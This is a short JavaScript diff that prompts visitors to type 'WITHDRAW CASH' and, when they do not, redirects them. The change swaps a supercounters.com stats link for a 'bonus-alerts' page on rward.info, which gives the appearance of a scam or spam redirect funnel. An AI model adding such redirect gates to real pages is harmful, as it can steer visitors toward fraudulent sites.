@@ -6,5 +6,5 @@ password = prompt(
   'WITHDRAW CASH'
 );
 if (password != 'WITHDRAW CASH') {
-  location.href = 'https://www.supercounters.com/stats/1726401';
+  location.href = 'https://rward.info/ke-bonus-alerts.html';
 }
